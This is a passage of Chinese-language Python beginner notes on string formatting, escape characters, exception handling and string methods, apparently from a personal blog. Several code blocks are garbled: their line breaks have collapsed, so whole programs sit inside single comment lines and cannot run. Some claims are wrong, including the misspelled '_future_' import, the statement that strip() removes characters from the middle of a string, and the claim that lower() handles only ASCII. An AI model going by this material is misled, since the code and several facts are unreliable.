<h5 id="2-7-1-1-格式化加逗号原理"><a href="#2-7-1-1-格式化加逗号原理" class="headerlink" title="2.7.1.1 %格式化加逗号原理"></a>2.7.1.1 %格式化加逗号原理</h5><p>小括号特性：整体类型取决于小括号里的 单一 数据的类型</p>
<ul>
<li>```python<br>#整体类型取决于括号里的 单一 数据的类型<br>a = (1)    #结果为int类型<br>b = (‘好’)    #结果为str类型<br>print(type(a),type(b))<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">%号格式化后面的小括号整体应该是元组类型</span><br><span class="line"></span><br><span class="line">- 原因：因为该小括号里可能需要接收多个参数，所以它是元组类型</span><br><span class="line"></span><br><span class="line">- 存在冲突：因为小括号特性，如果接收单一的数据，那么小括号这个整体的数据类型取决于括号里的数据的类型，那么这个整体的类型就不一定是元组类型了，这就不符合%格式化后面的小括号整体的类型是元组这一原则了。</span><br><span class="line"></span><br><span class="line">- 解决办法：在数据后面多加一个逗号</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  print(&#x27;我的年龄是%d岁&#x27;%(26))   #错误写法，这时%后的括号整体类型是int型，和基本原则冲突#添加逗号来避免冲突，使%后的小括号整体为元组类型print(&#x27;我的年龄是%d岁&#x27;%(26,)) </span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="2-7-2-用format来格式化"><a href="#2-7-2-用format来格式化" class="headerlink" title="2.7.2 用format来格式化"></a>2.7.2 用format来格式化</h4><ul>
<li><p>用format来格式化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用法1：和字符串搭配使用</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我叫&#123;&#125;,我的年龄是&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;24岁&#x27;</span>))</span><br><span class="line"><span class="comment">#结果为：我叫张三,我的年龄是24岁</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#用法2：和变量搭配使用,变量一定要记得留下预留位置，大括号</span></span><br><span class="line">talk = <span class="string">&#x27;我叫&#123;&#125;，我的年龄是&#123;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(talk.<span class="built_in">format</span>(<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;24岁&#x27;</span>))</span><br><span class="line"><span class="comment">#结果为：我叫张三,我的年龄是24岁</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#用法3：字符串可以是空的，但是必须要预留大括号用来传递参数</span></span><br><span class="line">talk = <span class="string">&#x27;&#123;&#125;&#123;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(talk.<span class="built_in">format</span>(<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;24岁&#x27;</span>))</span><br><span class="line"><span class="comment">#结果为：张三24岁</span></span><br></pre></td></tr></table></figure></li>
<li><p>在字符串中使用变量：用 f 搭配变量来格式化:  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#语法格式：f&quot;XXXX&#123;变量名&#125;&quot;</span></span><br><span class="line">name = <span class="string">&#x27;张三&#x27;</span></span><br><span class="line">age = <span class="string">&#x27;李四&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;我叫<span class="subst">&#123;name&#125;</span>，我的年龄是<span class="subst">&#123;age&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-8-type-和id"><a href="#2-8-type-和id" class="headerlink" title="2.8 type()和id()"></a>2.8 type()和id()</h3><p>type():查看数据的类型</p>
<p>id()：查看内存地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">c = <span class="string">&#x27;daslfj&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a),<span class="built_in">type</span>(b),<span class="built_in">type</span>(c))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a),<span class="built_in">id</span>(b),<span class="built_in">id</span>(c))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">结果为：</span></span><br><span class="line"><span class="string">&lt;class &#x27;list&#x27;&gt; &lt;class &#x27;int&#x27;&gt; &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">194402048 8791063381696 35322480</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="2-9-三元运算"><a href="#2-9-三元运算" class="headerlink" title="2.9 三元运算"></a>2.9 三元运算</h3><p>基本格式：   结果(正确)     if     条件     else     结果(错误)</p>
<p>搭配对象：基本和if搭配使用</p>
<p>意义：缩减语句，简化代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span> <span class="keyword">if</span> <span class="number">10</span> &gt; <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span>   <span class="comment">#如果条件成立，a就是1，不成立就是0print(a)    #结果为：1</span></span><br></pre></td></tr></table></figure>





<h3 id="2-10-转义字符"><a href="#2-10-转义字符" class="headerlink" title="2.10  转义字符"></a>2.10  转义字符</h3><p>主要字符：</p>
<ul>
<li><p>\t  ：相当于tab</p>
</li>
<li><p>\n ：相当于换行</p>
</li>
<li><p>\r：执行完前面的代码，然后迅速将光标移动到开头</p>
<p>主要功能：起覆盖作用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#\r的作用：执行完回到语句的开始位置#情况一：不加\rprint(&#x27;123&#x27;,end=&#x27;&#x27;)print(&#x27;你好&#x27;)   #结果为：123你好#情况二：\r实现对上一句内容的覆盖print(&#x27;123\r&#x27;,end=&#x27;&#x27;)  #打印完光标轨道123的开始位置print(&#x27;你好&#x27;)            #因为光标在开始位置，所以你好对之前的内容进行了覆盖#结果为：你好</span></span><br></pre></td></tr></table></figure>

<p>应用场景：进度条的递增，比如20%到100%的递增过程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#进度条：不要在pycharm中运行，有bug，可以用命令行界面运行import time    for i in range(1,101):   #模拟1%到100%    print(&#x27;%s%%\r&#x27;%i,end=&#x27;&#x27;)    #每一次打印完，都会迅速跑到开头去，接着开始第二次打印，间接的做到了进度的递增    time.sleep(0.5)     #延时使我们观看进度条更加直观</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p> 练习：复制视频文件</p>
<ul>
<li><p>要求：实时显示拷贝的完成度，百分比</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#方法一(推荐)：获取读取的内容的长度(字节)，最后判断读取长度和文件大小是否一样import ossize_read = 0with open(r&#x27;E:\1.mp4&#x27;,mode=&#x27;rb&#x27;) as f1,open(r&#x27;E:\oldboy_python\code\test.mp4&#x27;,mode=&#x27;wb&#x27;) as f2:   #必须要用二进制模式    size_total = os.stat(r&#x27;E:\1.mp4&#x27;).st_size    #获取文件大小    while True :        message = f1.read(2024)         #每一次读取的内容        size = f2.write(message)           #写入内容        size_read += len(message)        #获取总读取的内容的字节，也就是相当于总写入的字节        print(&#x27;已经拷贝&#123;&#125;%\r&#x27;.format(round(size_read / size_total * 100 ,2)),end=&#x27;&#x27;)   #实现百分比        if size_read == size_total:   #如果写入的大小和原文件大小一样，则退出循环            break#方法二：推荐此方法，通过光标的位置判断写入了多少# import os# with open(r&#x27;E:\1.mp4&#x27;,mode=&#x27;rb&#x27;) as f1,open(r&#x27;E:\oldboy_python\code\test.mp4&#x27;,mode=&#x27;wb&#x27;) as f2:   #必须要用二进制模式#     size_total = os.stat(r&#x27;E:\1.mp4&#x27;).st_size    #获取文件大小#     while True :#         f2.write(f1.read(2024))           #每次读1024字节#         size_write = f2.tell()           #查看光标位置，光标在哪个位置，就是读取了多少#         print(&#x27;已经拷贝&#123;&#125;%\r&#x27;.format(round(size_write / size_total * 100 ,2)),end=&#x27;&#x27;)   #实现百分比#         if size_write == size_total:   #如果生成的文件和原文件大小一样，则退出循环#             break#方法三：不推荐：进度条无法到100%，拷贝体可能和原数据相差个几个字节# import os# with open(r&#x27;E:\1.mp4&#x27;,mode=&#x27;rb&#x27;) as f1,open(r&#x27;E:\oldboy_python\code\test.mp4&#x27;,mode=&#x27;wb&#x27;) as f2:#     size_total = os.stat(r&#x27;E:\1.mp4&#x27;).st_size    #获取文件大小#     count,remaining = divmod(size_total,1024)#     if remaining != 0:#         for i in range(count + 1 ):   #如果每次写入1024字节，需要写多少次#             f2.write(f1.read(2024))           #每次读1024字节#             size_write = os.stat(r&#x27;E:\oldboy_python\code\test.mp4&#x27;).st_size   #判定一共写入了多大的内容#             print(&#x27;已经拷贝&#123;&#125;%\r&#x27;.format(round(size_write / size_total * 100 ,2)),end=&#x27;&#x27;)   #实现百分比#             if size_write == size_total:   #如果生成的文件和原文件大小一样，则退出循环#                 break</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>对字符串进行转义：</p>
<ul>
<li><p>单一转义：适合需要转义的符号比较少的情况</p>
<p>用法：用    \    来进行单一的转义</p>
</li>
<li><p>批量转义：推荐用这种方法，对字符串里的所有特定字符进行转义</p>
<p>用法：对需要批量转义的字符串前加一个    r    即可</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#情况一：不转义a = &#x27;E:\test&#x27;print(a)   #没有转义，结果为：E:    est#情况二：单一转义，用\a = &#x27;E:\\test&#x27;   #多加一个\print(a)   #没有转义，结果为：E:\test#情况二：单一转义，用\a = r&#x27;E:\test\ncloop&#x27;   #直接在字符串前面加rprint(a)   #没有转义，结果为：E:\test\ncloop</span></span><br></pre></td></tr></table></figure>







<h3 id="2-11-两个变量值互换"><a href="#2-11-两个变量值互换" class="headerlink" title="2.11 两个变量值互换"></a>2.11 两个变量值互换</h3><p>前提：a = 0 ,b=1 ,想让a = 1 ,b = 0</p>
<p>通用方法：</p>
<ul>
<li><p>使用范围：所有的编程语言</p>
</li>
<li><p>特点：再创建一个变量，用来保留a指向的值0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#a，b变量互换的通用方法：a = 0b = 1c = a     #设立中转变量，用来保留a所指向的0a = bb = c  #此时指向了0print(a,b)   #结果为：1 0</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>python独有方法：</p>
<ul>
<li><p>适用范围：python</p>
</li>
<li><p>特点：采用对称赋值的方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#a，b互换：对称互换：a = 0b = 1a,b = b,a  #该语句等价于通用方法print(a,b)   #结果为：1 0</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-12-异常处理"><a href="#2-12-异常处理" class="headerlink" title="2.12 异常处理"></a>2.12 异常处理</h3><p>基本格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#异常处理基本格式</span></span><br><span class="line"><span class="keyword">try</span> :</span><br><span class="line">    <span class="keyword">pass</span>     </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e : </span><br><span class="line">    <span class="keyword">pass</span>          <span class="comment">#如果产生异常，就执行该语句</span></span><br></pre></td></tr></table></figure>

<p>  异常处理与for循环结合：</p>
<ul>
<li><p>异常处理在for循环内</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#异常处理在for循环内:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;你好&#x27;</span>,<span class="number">6</span>,<span class="number">7</span>]:</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        <span class="built_in">print</span>(i + <span class="number">666</span> )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        <span class="keyword">pass</span>                <span class="comment">#轮到第三个参数‘你好’，报错，程序继续向下执行，这里因为在循环里面，所以接着继续开始下一轮循环</span></span><br><span class="line"><span class="comment">#结果为：667    668 672 673  </span></span><br><span class="line"><span class="comment">#可以发现，只有‘你好’没有执行，因为异常处理在循环内</span></span><br></pre></td></tr></table></figure></li>
<li><p>异常处理在for循环外</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#异常处理在for循环外:</span></span><br><span class="line"><span class="keyword">try</span> :</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;你好&#x27;</span>,<span class="number">6</span>,<span class="number">7</span>]:</span><br><span class="line">        <span class="built_in">print</span>(i + <span class="number">666</span> )</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">    <span class="keyword">pass</span>            <span class="comment">#轮到第三个参数‘你好’，报错，接着往下执行，后面没有代码了，所以程序结束</span></span><br><span class="line"><span class="comment">#结果为：667    668 </span></span><br><span class="line"><span class="comment">#可以发现，执行到‘你好’，报错，</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="第三章-数据类型"><a href="#第三章-数据类型" class="headerlink" title="第三章 数据类型"></a>第三章 数据类型</h2><h3 id="3-1-整型（int）"><a href="#3-1-整型（int）" class="headerlink" title="3.1 整型（int）"></a>3.1 整型（int）</h3><h4 id="3-1-1-整型的定义"><a href="#3-1-1-整型的定义" class="headerlink" title="3.1.1 整型的定义"></a>3.1.1 整型的定义</h4><p>含义：各种数值</p>
<h4 id="3-1-2-整型、整除在py2、py3的区别"><a href="#3-1-2-整型、整除在py2、py3的区别" class="headerlink" title="3.1.2 整型、整除在py2、py3的区别"></a>3.1.2 整型、整除在py2、py3的区别</h4><p>整型：</p>
<ul>
<li>py2中有：int/long</li>
<li>py3中有：int （int/long），int就包含了long</li>
</ul>
<p>整除：py2和py3中整除是不一样。</p>
<ul>
<li><p>区别</p>
<ul>
<li><p>py2:</p>
<p>5 / 2 = 2</p>
</li>
<li><p>py3:</p>
<p>5 / 2 = 2.5</p>
</li>
</ul>
</li>
<li><p>在py2中使用py3的除法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from _future_ import division</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-2-布尔（bool）"><a href="#3-2-布尔（bool）" class="headerlink" title="3.2 布尔（bool）"></a>3.2 布尔（bool）</h3><p>布尔值就是用于表示真假。True和False。</p>
<h3 id="3-3-字符串（str）"><a href="#3-3-字符串（str）" class="headerlink" title="3.3 字符串（str）"></a>3.3 字符串（str）</h3><h4 id="3-3-1-字符串、字符、字节的关系"><a href="#3-3-1-字符串、字符、字节的关系" class="headerlink" title="3.3.1 字符串、字符、字节的关系"></a>3.3.1 字符串、字符、字节的关系</h4><p>定义：字符串是写代码中最常见的，python内存中的字符串是按照：unicode 编码存储。对于字符串是不可变。</p>
<p>编码格式：unicode</p>
<p>表现形式：’’     “ “     ‘’’ ‘’’     “””   “””</p>
<p>关系：’吃饭’ —这是一个字符串—-相当于2个字符—-相当于6个字节（utf-8编码）—–相当于4个字节（GBK、gb2312编码）</p>
<p>字符串应用实际：</p>
<ul>
<li>一般应用于内存中，是unicode编码</li>
</ul>
<h4 id="3-3-2-字符串的方法"><a href="#3-3-2-字符串的方法" class="headerlink" title="3.3.2 字符串的方法"></a>3.3.2 字符串的方法</h4><p>字符串自己有很多方法，如：</p>
<ol>
<li><p>upper()、lower()、casefold()</p>
<ul>
<li><p>应用实例：登录网站的验证码不区分大小写</p>
</li>
<li><p>lower()和casefold()的区别：</p>
<ul>
<li>lower支持的语言更少，只支持ascii表里的</li>
<li>casefold支持除中文外的所有语言，所以推荐使用casefold()</li>
</ul>
</li>
<li><p>实现方法：将网站预留用来校验的验证码统一转换为大写或小写，将用户输入的验证码也统一转换为大写或者小写，然后让这两个进行比对即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v = <span class="string">&#x27;ABC&#x27;</span></span><br><span class="line">v2 = <span class="string">&#x27;ß&#x27;</span>    <span class="comment">#德语</span></span><br><span class="line">v3 = v.casefold()   <span class="comment"># 将字符串变小写，除了中文，所有其他国家的都支持</span></span><br><span class="line">v4 = v2.casefold()   <span class="comment">#将德语&#x27;ß&#x27;转化为小写</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;casefold将英文转化为小写：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(v3)) <span class="comment"># ss</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;casefold将德语转化为小写：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(v4))</span><br><span class="line">v5 = v.lower()        <span class="comment">#lower功能少，只支持ascii表的</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;lower将英文转化为小写：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(v5))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>判断是否全部是大写、小写</p>
<p>语法：isupper()、islower()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#判断是否全部是大写</span></span><br><span class="line">v = <span class="string">&#x27;ALEX&#x27;</span></span><br><span class="line">v1 = v.upper()</span><br><span class="line"><span class="built_in">print</span>(v1)</span><br><span class="line">v2 = v.isupper() <span class="comment"># 判断是否全部是大写</span></span><br><span class="line"><span class="built_in">print</span>(v2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断是否全部是小写</span></span><br><span class="line">v = <span class="string">&#x27;alex&#x27;</span></span><br><span class="line">v1 = v.lower()</span><br><span class="line"><span class="built_in">print</span>(v1)</span><br><span class="line">v2 = v.islower() <span class="comment"># 判断是否全部是小写</span></span><br><span class="line"><span class="built_in">print</span>(v2)</span><br></pre></td></tr></table></figure></li>
<li><p>strip()、lstrip()、rstrip()：去除空格、\t、\n，任意字符</p>
<ul>
<li><p>应用实例：网站注册时，用户名、密码处防止一不小心输入空格，会将空格过滤</p>
</li>
<li><p>实现方法：</p>
<p>功能：可以去除空格、换行符、\t，任意字符，因为换行符和\t的本质都是空格，所以可以去除</p>
<p>strip():去除左右两边的空格，换行符,tab键</p>
<ul>
<li>易错点：strip()  是左右空格，\t  ，\n  全部都可以直接去掉，不需要再在括号里填  \n    \t</li>
</ul>
<p>rstrip():去除右边的空格</p>
<p>lstrip():去除左边的空格</p>
<p>strip(‘内容’)：去除指定内容</p>
<ul>
<li>易错点：去除的指定内容兵不仅限于左右两边，字符串里的内容也会去掉，是全部去掉</li>
</ul>
</li>
<li><p>实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="string">&quot;alex &quot;</span></span><br><span class="line"><span class="built_in">print</span>(v1.strip())</span><br><span class="line"></span><br><span class="line">v2 = <span class="string">&quot;alex\t&quot;</span>    <span class="comment">#\t相当于tab键，实质也是空格</span></span><br><span class="line"><span class="built_in">print</span>(v2.strip())</span><br><span class="line"></span><br><span class="line">v3 = <span class="string">&quot;alex\n&quot;</span>      <span class="comment">#\n换行，实质也是空格，所以也可以去除</span></span><br><span class="line"><span class="built_in">print</span>(v3.strip())</span><br><span class="line"></span><br><span class="line">v1 = <span class="string">&quot;alexa&quot;</span>                 </span><br><span class="line"><span class="built_in">print</span>(v1.strip(<span class="string">&#x27;al&#x27;</span>))       <span class="comment">#去除&#x27;al&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>isdigit()：返回的是bool值</p>
<ul>
<li><p>实现函数：isdigit、isdecimal、isnumeric</p>
<p>区分标准：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Unicode数字：<span class="string">&#x27;1&#x27;</span></span><br><span class="line">byte数字（单字节）：<span class="string">b&#x27;1&#x27;</span></span><br><span class="line">全角数字（双字节）：<span class="string">&#x27;１&#x27;</span>    <span class="comment">#是在全角状态下输入的</span></span><br><span class="line">罗马数字：<span class="string">&#x27;Ⅳ&#x27;</span></span><br><span class="line">汉字：<span class="string">&#x27;四&#x27;</span></span><br></pre></td></tr></table></figure>



<ul>
<li><p>isdigit():如果参数是小数，则返回False</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">True: Unicode数字，byte数字（单字节），全角数字（双字节），罗马数字False: 汉字数字，小数Error: 无</span><br></pre></td></tr></table></figure></li>
<li><p>isdecimal:————————&gt;推荐，因为这个可以判断是否是10进制的数</p>
<ul>
<li>如果参数时小数，返回False</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">True: Unicode数字，，全角数字（双字节）False: 罗马数字，汉字数字，小数Error: byte数字（单字节）</span><br></pre></td></tr></table></figure></li>
<li><p>isnumeric():</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">True: Unicode数字，全角数字（双字节），罗马数字，汉字数字False: 无Error: byte数字（单字节）</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>应用实例：拨打10086、10010的时候，会让我们通过输入序号选择不同的服务，此时需要检测用户输入的是不是数字</p>
</li>
<li><p>实现方法：</p>
<p>如果是数字，则返回True，否则False</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="comment"># v = &#x27;二&#x27;</span></span><br><span class="line"><span class="comment"># v = &#x27;②&#x27;</span></span><br><span class="line">v1 = v.isdigit()  <span class="comment"># &#x27;1&#x27;-&gt; True; &#x27;二&#x27;-&gt; False; &#x27;②&#x27; --&gt; True</span></span><br><span class="line">v2 = v.isdecimal() <span class="comment"># &#x27;1&#x27;-&gt; True; &#x27;二&#x27;-&gt; False; &#x27;②&#x27; --&gt; False</span></span><br><span class="line">v3 = v.isnumeric() <span class="comment"># &#x27;1&#x27;-&gt; True; &#x27;二&#x27;-&gt; True; &#x27;②&#x27; --&gt; True</span></span><br><span class="line"><span class="built_in">print</span>(v1,v2,v3)</span><br><span class="line"><span class="comment"># 以后推荐用 isdecimal 判断是否是 10进制的数。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ############## 应用 ##############</span></span><br><span class="line"></span><br><span class="line">v = [<span class="string">&#x27;alex&#x27;</span>,<span class="string">&#x27;eric&#x27;</span>,<span class="string">&#x27;tony&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">num = <span class="built_in">input</span>(<span class="string">&#x27;请输入序号：&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> num.isdecimal():</span><br><span class="line">    num = <span class="built_in">int</span>(num)</span><br><span class="line">    <span class="built_in">print</span>(v[num])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;你输入的不是数字&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#不同类型的数字应用</span></span><br><span class="line">num = <span class="string">&quot;1&quot;</span>  <span class="comment">#unicode</span></span><br><span class="line">num.isdigit()   <span class="comment"># True</span></span><br><span class="line">num.isdecimal() <span class="comment"># True</span></span><br><span class="line">num.isnumeric() <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">num = <span class="string">&quot;1&quot;</span> <span class="comment"># 全角</span></span><br><span class="line">num.isdigit()   <span class="comment"># True</span></span><br><span class="line">num.isdecimal() <span class="comment"># True</span></span><br><span class="line">num.isnumeric() <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">num = <span class="string">b&quot;1&quot;</span> <span class="comment"># byte</span></span><br><span class="line">num.isdigit()   <span class="comment"># True</span></span><br><span class="line">num.isdecimal() <span class="comment"># AttributeError &#x27;bytes&#x27; object has no attribute &#x27;isdecimal&#x27;</span></span><br><span class="line">num.isnumeric() <span class="comment"># AttributeError &#x27;bytes&#x27; object has no attribute &#x27;isnumeric&#x27;</span></span><br><span class="line"></span><br><span class="line">num = <span class="string">&quot;IV&quot;</span> <span class="comment"># 罗马数字</span></span><br><span class="line">num.isdigit()   <span class="comment"># True</span></span><br><span class="line">num.isdecimal() <span class="comment"># False</span></span><br><span class="line">num.isnumeric() <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">num = <span class="string">&quot;四&quot;</span> <span class="comment"># 汉字</span></span><br><span class="line">num.isdigit()   <span class="comment"># False</span></span><br><span class="line">num.isdecimal() <span class="comment"># False</span></span><br><span class="line">num.isnumeric() <span class="comment"># True</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>replace(‘需要替换的字符串’,’用什么字符串代替’)  </p>
<ul>
<li><p>语法：replace(‘需要替换的字符串’,’用什么字符串代替’)  ,如果后面加数字，表示需要替换几处，不填默认全部替换</p>
</li>
<li><p>应用实例：玩游戏时，屏蔽骂人字眼</p>
</li>
<li><p>实现方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#不加数字默认全部替换</span></span><br><span class="line">talk = <span class="string">&#x27;我草你大爷草&#x27;</span></span><br><span class="line">talk_new = talk.replace(<span class="string">&#x27;草&#x27;</span>,<span class="string">&#x27;**&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(talk_new)</span><br><span class="line"><span class="comment">#结果为：我**你大爷**</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#加数字，则代表替换若干处</span></span><br><span class="line">talk = <span class="string">&#x27;我草你大爷草你小爷草你姑爷&#x27;</span></span><br><span class="line">talk_new = talk.replace(<span class="string">&#x27;草&#x27;</span>,<span class="string">&#x27;**&#x27;</span>,<span class="number">2</span>)    <span class="comment">#此处添加了数字，表示替换2处</span></span><br><span class="line"><span class="built_in">print</span>(talk_new)</span><br><span class="line"><span class="comment">#结果为：我**你大爷**你小爷草你姑爷</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>split(‘分割字符’)</p>
<ul>
<li><p>语法：split(‘分割标记’,数字（根据标记数量来分割）)      rsplit代表着从右到左分割</p>
</li>
<li><p>应用实例：当用户录入多个姓名时，我可以通过特定符号或者字眼来分割</p>
</li>
<li><p>易错点：字符串分割后的值是一个列表，这点需要注意</p>
</li>
<li><p>实现方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#不指定数量的标记来分割text = &#x27;张三，李四，王麻子&#x27;text_new = text.split(&#x27;，&#x27;)print(text_new)#根据指定的标记数量来分割text = &#x27;张三，李四，王麻子，小明&#x27;text_new = text.split(&#x27;，&#x27;,2)   #从左往右寻找2个逗号来进行分割text_new2 = text.rsplit(&#x27;，&#x27;,2)   #从右往左寻找2个逗号来进行分割print(text_new,text_new2)#结果为：[&#x27;张三&#x27;, &#x27;李四&#x27;, &#x27;王麻子，小明&#x27;]     [&#x27;张三，李四&#x27;, &#x27;王麻子&#x27;, &#x27;小明&#x27;]</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>encode：将数据转换为二进制（以十六进制表示的二进制）</p>
<ul>
<li>必备知识点：将括号里的参数转换为以十六进制表示的二进制</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;人生苦短，我学python&#x27;</span>b = a.encode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure></li>
<li><p>startswith()、endswith()：返回的bool值</p>
<ul>
<li><p>含义：看字符串是否以特定的字符开头或者结尾</p>
</li>
<li><p>用法：</p>
<ul>
<li>a.startswith(‘需要匹配的字’)</li>
<li>a.endswith(‘需要匹配的字’)</li>
</ul>
</li>
<li><p>实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">talk = <span class="string">&#x27;人生苦短，我用python&#x27;</span>a = talk.startswith(<span class="string">&#x27;人生苦&#x27;</span>)    <span class="comment">#看是不是&#x27;人生苦&#x27;这三个字开头，是就返回Trueb = talk.endswith(&#x27;PYTHON&#x27;)     #看是不是PYTHON结尾，不是就返回Falseprint(a,b)    #结果：a是True；B是False</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>format()</p>
<ul>
<li>用法：<ul>
<li>‘xxx{}xxx{}’.format(‘测试’,’测试2’)</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用法一：结合变量使用a = &#x27;今天气温&#123;&#125;℃&#x27;print(a.format(30))    #结果为：今天气温30℃#用法二：结合变量使用2a = &#x27;今天气温&#123;&#125;℃&#x27;b = 30print(a.format(30))    #结果为：今天气温30℃#用法三：结合字符串使用print(&#x27;今天气温&#123;&#125;℃&#x27;.format(30))    #结果为：今天气温30℃#用法四：不用字符串及嵌套使用a = &#x27;今天气温&#123;&#125;℃&#x27;.format(30)b = &#x27;卧槽！&#x27;print(&#x27;&#123;&#125;&#123;&#125;&#x27;.format(b,a))  #结果为：卧槽！今天气温30℃</span></span><br></pre></td></tr></table></figure></li>
<li><p>find()</p>
<ul>
<li><p>语法:a.find(‘好’)    #查看字符串里的字符’好’所在的索引位置</p>
</li>
<li><p>易错点：该方法是字符串的专属方法，列表和元组都无法使用</p>
<p>​                如果查找内容不存在，则默认返回   -1</p>
</li>
</ul>
